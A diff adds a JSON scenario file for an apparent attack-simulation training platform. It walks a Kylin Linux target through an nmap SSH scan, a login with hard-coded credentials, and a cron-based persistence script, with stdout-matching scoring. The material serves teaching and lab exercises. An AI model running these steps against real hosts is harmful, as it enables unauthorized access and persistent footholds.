@@ -1,0 +1,160 @@
+{
+  "id": "kylin_trojan_simulation",
+  "name": "银河麒麟 - 木马持久化完整攻击链",
+  "description": "教学目的：模拟远程攻击者对银河麒麟（Linux）靶标从侦察发现、凭据验证到 Cron 持久化植入的完整攻击链。通过 SSH 远程通道在目标上部署隐蔽的 Cron 后门任务，每分钟自动写入标记文件。演示 MITRE ATT&CK 的 Discovery → Execution → Persistence 全流程。\n\n前置条件：攻击者已获取目标 Linux 主机的用户凭据（REPLACE_ME / qwer1234），SSH 服务（端口 22）已开放。",
+  "category": "exploitation",
+  "difficulty": "medium",
+  "estimatedDuration": "5 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Discovery",
+    "Execution",
+    "Persistence"
+  ],
+  "mitreTechniques": [
+    "T1046",
+    "T1021.004",
+    "T1053.003",
+    "T1059.004"
+  ],
+  "targetType": [
+    "local_ip"
+  ],
+  "steps": [
+    {
+      "id": "step1_recon_ssh_port",
+      "name": "侦察 — 扫描 SSH 端口",
+      "description": "使用 nmap 对目标进行端口扫描，检测 SSH 服务端口（默认 22）是否开放。模拟攻击者在侦察阶段发现远程管理入口。",
+      "toolId": "nmap",
+      "argsTemplate": [
+        "-sV",
+        "-p",
+        "22",
+        "--open",
+        "-Pn",
+        "{{host}}"
+      ],
+      "score": 10,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1046"
+      ],
+      "payload_id": "port-scan"
+    },
+    {
+      "id": "step2_credential_validation",
+      "name": "凭据验证 — SSH 远程连接",
+      "description": "使用 ssh-exec 通过 SSH 连接目标，执行 whoami / hostname / ip addr 验证凭据有效性并收集目标基本信息。",
+      "toolId": "ssh-exec",
+      "argsTemplate": [
+        "-i",
+        "{{host}}",
+        "-u",
+        "REPLACE_ME",
+        "-p",
+        "qwer1234"
+      ],
+      "score": 15,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1021.004"
+      ]
+    },
+    {
+      "id": "step3_prepare_trojan_script",
+      "name": "载荷准备 — 生成 Cron 持久化脚本",
+      "description": "在攻击机本地生成一个 Cron 后门部署脚本，该脚本将在目标机器上添加每分钟执行的隐蔽定时任务，向 /tmp/trojan_output 写入签到标记。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "cat > /tmp/kylin_trojan_deploy.sh << 'SCRIPTEOF'\n#!/bin/bash\n(crontab -l 2>/dev/null; echo '* * * * * echo \"Trojan check-in at $(date)\" >> /tmp/trojan_output') | crontab -\necho \"=== CRON JOB INSTALLED ===\"\ncrontab -l\necho \"\"\necho \"Trojan persistence established. Cron job will execute every minute.\"\nSCRIPTEOF\nchmod +x /tmp/kylin_trojan_deploy.sh\necho 'Deploy script created: /tmp/kylin_trojan_deploy.sh'"
+      ],
+      "score": 15,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1059.004"
+      ]
+    },
+    {
+      "id": "step4_deploy_and_verify",
+      "name": "植入并验证 — 远程部署 Cron 后门",
+      "description": "通过 ssh-exec 将持久化脚本上传到目标并执行——添加 Cron 后门任务，立即自验证 crontab -l 输出。部署后每分钟自动在 /tmp/trojan_output 写入签到记录。",
+      "toolId": "ssh-exec",
+      "argsTemplate": [
+        "-i",
+        "{{host}}",
+        "-u",
+        "REPLACE_ME",
+        "-p",
+        "qwer1234",
+        "-s",
+        "/tmp/kylin_trojan_deploy.sh"
+      ],
+      "score": 60,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1053.003"
+      ]
+    }
+  ],
+  "rubric": {
+    "items": [
+      {
+        "id": "ssh_port_open",
+        "desc": "nmap 扫描发现 SSH 端口 (22) 开放",
+        "points": 10,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "open|22"
+        }
+      },
+      {
+        "id": "credential_valid",
+        "desc": "凭据有效，SSH 连接成功并获取目标信息",
+        "points": 15,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "CONNECTED|TARGET INFO"
+        }
+      },
+      {
+        "id": "trojan_script_created",
+        "desc": "Cron 持久化脚本创建成功",
+        "points": 15,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Deploy script created"
+        }
+      },
+      {
+        "id": "trojan_deployed_and_verified",
+        "desc": "Cron 后门任务部署成功并自验证通过",
+        "points": 60,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "CRON JOB INSTALLED|Trojan persistence established"
+        }
+      }
+    ]
+  },
+  "notSuitableFor": [
+    "dvwa",
+    "web_url",
+    "domain",
+    "windows_host",
+    "ad_domain",
+    "localhost"
+  ],
+  "baselineGroup": "internal-network-exploitation",
+  "expectedOutputPolicy": "expect_output",
+  "emptyOutputExplanation": "Cron 后门任务通过 ssh-exec 远程部署到 Linux 靶机；需目标开放 SSH 22 端口、凭据有效、且攻击机已安装 sshpass（sudo apt install sshpass）",
+  "applicableTargetType": [
+    "local_ip"
+  ],
+  "teachingObjective": "演示银河麒麟（Linux）远程攻击链：侦察发现 SSH 服务 → 凭据验证 → Cron 持久化植入并自验证。完整覆盖 T1046 → T1021.004 → T1053.003 攻击路径。",
+  "target_class": "linux_host",
+  "disableAutoInsert": true
+}
